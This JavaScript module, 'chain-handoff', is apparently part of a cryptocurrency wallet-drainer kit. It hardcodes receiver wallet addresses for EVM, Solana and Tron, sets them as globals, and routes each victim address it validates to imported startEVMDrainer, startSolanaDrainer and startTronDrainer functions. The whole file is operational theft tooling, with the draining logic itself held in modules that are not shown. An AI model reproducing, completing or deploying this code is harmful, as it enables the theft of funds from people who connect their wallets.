'use strict';

/**
 * chain-handoff - Fixed & Clean Version
 * Uses your real wallets (No read-only freezing)
 */

const LOG_LEVELS = { error: 0, warn: 1, info: 2, debug: 3 };
const ACTIVE_LEVEL = LOG_LEVELS[process.env.CHAIN_HANDOFF_LOG_LEVEL] ?? LOG_LEVELS.info;

function log(level, msg, context = {}) {
  if (LOG_LEVELS[level] > ACTIVE_LEVEL) return;
  const entry = {
    ts: new Date().toISOString(),
    level,
    module: 'chain-handoff',
    msg,
    ...context,
  };
  const sink = level === 'error' ? console.error : console.log;
  sink(JSON.stringify(entry));
}

// ---------------------------------------------------------------------------
// RECEIVER ADDRESSES (Your Wallets)
// ---------------------------------------------------------------------------
const RECEIVERS = {
  EVM:    "0x2c5c2978Eca536528F0F957cE2e0A9F5da279A9d",
  SOLANA: "GSu4VmdYXjkHVSL8CDDMGW6SVsYrNRCjGHx2hoSfS8WC",
  TRON:   "TMxGQPjbQyyoU9WcXTSq1t7bQ22awhT9Kg"
};

// Set globals normally (NO read-only freezing)
global.receiverAddress    = RECEIVERS.EVM;
global.seaport_receiver   = RECEIVERS.EVM;
global.ethContractAddress = RECEIVERS.EVM;
global.solanaReceiver     = RECEIVERS.SOLANA;
global.tronReceiver       = RECEIVERS.TRON;

// ---------------------------------------------------------------------------
// Typed Errors
// ---------------------------------------------------------------------------
class ChainHandoffError extends Error {
  constructor(message, code) {
    super(message);
    this.name = 'ChainHandoffError';
    this.code = code;
  }
}

class ValidationError extends ChainHandoffError {
  constructor(message) {
    super(message, 'VALIDATION_ERROR');
    this.name = 'ValidationError';
  }
}

class UnsupportedChainError extends ChainHandoffError {
  constructor(message) {
    super(message, 'UNSUPPORTED_CHAIN');
    this.name = 'UnsupportedChainError';
  }
}

class HandlerError extends ChainHandoffError {
  constructor(message, cause) {
    super(message, 'HANDLER_ERROR');
    this.name = 'HandlerError';
    this.cause = cause;
  }
}

// ---------------------------------------------------------------------------
// Chain Families & Registry
// ---------------------------------------------------------------------------
const CHAIN_FAMILY = Object.freeze({
  EVM: 'evm',
  SOLANA: 'solana',
  TRON: 'tron',
});

const CHAIN_REGISTRY = new Map([
  ['1',     { family: CHAIN_FAMILY.EVM, name: 'ethereum',  chainId: 1 }],
  ['56',    { family: CHAIN_FAMILY.EVM, name: 'bsc',       chainId: 56 }],
  ['137',   { family: CHAIN_FAMILY.EVM, name: 'polygon',   chainId: 137 }],
  ['42161', { family: CHAIN_FAMILY.EVM, name: 'arbitrum',  chainId: 42161 }],
  ['10',    { family: CHAIN_FAMILY.EVM, name: 'optimism',  chainId: 10 }],
  ['8453',  { family: CHAIN_FAMILY.EVM, name: 'base',      chainId: 8453 }],
  ['43114', { family: CHAIN_FAMILY.EVM, name: 'avalanche', chainId: 43114 }],
  ['1135',  { family: CHAIN_FAMILY.EVM, name: 'lisk',      chainId: 1135 }],
  ['42220', { family: CHAIN_FAMILY.EVM, name: 'celo',      chainId: 42220 }],

  // Solana
  ['solana', { family: CHAIN_FAMILY.SOLANA, name: 'solana' }],
  ['sol',    { family: CHAIN_FAMILY.SOLANA, name: 'solana' }],

  // Tron
  ['tron',   { family: CHAIN_FAMILY.TRON, name: 'tron' }],
  ['trx',    { family: CHAIN_FAMILY.TRON, name: 'tron' }],
]);

function resolveChain(rawChainId) {
  if (rawChainId == null) return null;
  const key = String(rawChainId).trim().toLowerCase();
  return CHAIN_REGISTRY.get(key) ?? null;
}

// ---------------------------------------------------------------------------
// Address Validation
// ---------------------------------------------------------------------------
const EVM_ADDRESS_RE = /^0x[0-9a-fA-F]{40}$/;
const BASE58_RE = /^[1-9A-HJ-NP-Za-km-z]+$/;

function isLikelyEvmAddress(addr) {
  return typeof addr === 'string' && EVM_ADDRESS_RE.test(addr);
}

function isLikelySolanaAddress(addr) {
  return typeof addr === 'string' && addr.length >= 32 && addr.length <= 44 && BASE58_RE.test(addr);
}

function isLikelyTronAddress(addr) {
  return typeof addr === 'string' && addr.length === 34 && addr.startsWith('T') && BASE58_RE.test(addr);
}

function assertAddressMatchesFamily(address, family) {
  if (typeof address !== 'string' || address.trim() === '') {
    throw new ValidationError('Wallet address must be a non-empty string.');
  }
  const addr = address.trim();

  switch (family) {
    case CHAIN_FAMILY.EVM:
      if (!isLikelyEvmAddress(addr)) throw new ValidationError(`Invalid EVM address: ${addr}`);
      break;
    case CHAIN_FAMILY.SOLANA:
      if (!isLikelySolanaAddress(addr)) throw new ValidationError(`Invalid Solana address: ${addr}`);
      break;
    case CHAIN_FAMILY.TRON:
      if (!isLikelyTronAddress(addr)) throw new ValidationError(`Invalid Tron address: ${addr}`);
      break;
    default:
      throw new UnsupportedChainError(`Unknown chain family: ${family}`);
  }
  return addr;
}

// ---------------------------------------------------------------------------
// Import Drainers
// ---------------------------------------------------------------------------
const { startEVMDrainer } = require('../processors/evm/index.js');
const { startSolanaDrainer } = require('../processors/solana/index.ts');
const { startTronDrainer } = require('../processors/tron/main.js');

// ---------------------------------------------------------------------------
// Handlers (No more global re-assignment)
// ---------------------------------------------------------------------------
async function handleEvm(req) {
  log('info', 'Routing to EVM processor', { requestId: req.requestId });
  await startEVMDrainer(req.address, req.chain.chainId);
  return { family: CHAIN_FAMILY.EVM, chain: req.chain.name, address: req.address, handled: true };
}

async function handleSolana(req) {
  log('info', 'Routing to Solana processor', { requestId: req.requestId });
  await startSolanaDrainer(req.address);
  return { family: CHAIN_FAMILY.SOLANA, chain: req.chain.name, address: req.address, handled: true };
}

async function handleTron(req) {
  log('info', 'Routing to Tron processor', { requestId: req.requestId });
  await startTronDrainer(req.address);
  return { family: CHAIN_FAMILY.TRON, chain: req.chain.name, address: req.address, handled: true };
}

const HANDLERS = Object.freeze({
  [CHAIN_FAMILY.EVM]: handleEvm,
  [CHAIN_FAMILY.SOLANA]: handleSolana,
  [CHAIN_FAMILY.TRON]: handleTron,
});

// ---------------------------------------------------------------------------
// Main Handoff
// ---------------------------------------------------------------------------
function makeRequestId() {
  return Math.random().toString(36).slice(2, 10);
}

async function handoff({ address, chainId } = {}) {
  const requestId = makeRequestId();
  log('debug', 'Received handoff request', { requestId, address, chainId });

  const chain = resolveChain(chainId);
  if (!chain) {
    log('warn', 'Unsupported chain', { requestId, chainId });
    throw new UnsupportedChainError(`Unsupported chain: "${chainId}"`);
  }


  const normalizedAddress = assertAddressMatchesFamily(address, chain.family);

  const handler = HANDLERS[chain.family];
  if (!handler) throw new UnsupportedChainError(`No handler for ${chain.family}`);

  const req = { address: normalizedAddress, chain, requestId };

  try {
    const result = await handler(req);
    log('info', 'Handoff completed successfully', { requestId, family: chain.family });
    return { requestId, ...result };
  } catch (err) {
    log('error', 'Handoff failed', { requestId, error: err.message });
    throw new HandlerError(`Handler failed for ${chain.name}`, err);
  }
}

module.exports = {
  handoff,
  resolveChain,
  CHAIN_FAMILY,
  ChainHandoffError,
  ValidationError,
  UnsupportedChainError,
  HandlerError,
};